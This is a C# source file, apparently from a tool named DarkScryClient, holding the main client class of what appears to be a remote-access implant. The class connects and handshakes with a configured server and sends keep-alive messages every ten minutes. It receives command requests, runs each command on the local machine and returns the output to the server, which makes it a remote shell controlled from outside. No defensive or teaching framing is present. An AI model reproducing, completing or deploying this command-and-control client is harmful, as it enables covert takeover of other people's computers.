using System;
using System.Threading;
using DarkScryClient.Security.Protocls;
using DarkScryClient.Security.Protocols;
using DarkScryClient.Utils;

namespace DarkScryClient.Client
{
	internal class Client : IDisposable
	{
		private volatile bool _running = true;

		private readonly Logger _logger;
		private ACProtocolHandler _protocol;
		private CommandHandler _command;

		public Client()
		{
			_logger = new Logger(true);
			_command = new CommandHandler();
		}

		public void Start()
		{
			try
			{
				_protocol = new ACProtocolHandler(Config.ServerIp, Config.RemotePort, _logger);

				if (!_protocol.ConnectAndHandshake())
				{
					_logger.Log("Handshake failed => abort", Logger.LogLevel.Critical);
					return;
				}

				var keepAliveThread = new Thread(KeepAliveLoop) { IsBackground = true };
				keepAliveThread.Start();

				while (_running)
				{
					DSMessage dsMsg = _protocol.ReceiveMessage();
					if (dsMsg == null)
					{
						_logger.Log("Server closed or read error => breaking loop", Logger.LogLevel.Info);
						break;
					}

					switch (dsMsg.OpCode)
					{
						case DarkScryOpCode.CmdRequest:
							string cmdText = System.Text.Encoding.UTF8.GetString(dsMsg.Body);
							_logger.Log($"Received CMD: {cmdText}", Logger.LogLevel.Info);

							byte[] result = RunLocalCommand(cmdText);
							DSMessage respMsg = new DSMessage(DarkScryOpCode.CmdResponse, dsMsg.RequestId, result);
							_protocol.SendDSMessage(respMsg);
							break;

						default:
							_logger.Log($"Unhandled opcode: {dsMsg.OpCode}", Logger.LogLevel.Warning);
							break;
					}
				}
			}
			catch (Exception ex)
			{
				_logger.Log($"Client error: {ex.Message}", Logger.LogLevel.Critical);
			}
			finally
			{
				_running = false;
				_protocol?.Dispose();
			}
		}

		private void KeepAliveLoop()
		{
			while (_running)
			{
				try
				{
					DSMessage kaMsg = new DSMessage(DarkScryOpCode.KeepAlive, 0, Array.Empty<byte>());
					_protocol.SendDSMessage(kaMsg);
				}
				catch (Exception ex)
				{
					_logger.Log($"KeepAlive error => {ex.Message}", Logger.LogLevel.Error);
				}
				// 10 Minutes
				Thread.Sleep(600_000);
			}
		}

		private byte[] RunLocalCommand(string cmdText)
		{
			return _command.RunCommand(cmdText);
		}

		public void Dispose()
		{
			_running = false;
			_protocol?.Dispose();
			_logger?.Dispose();
			_command?.Dispose();
		}
	}
}
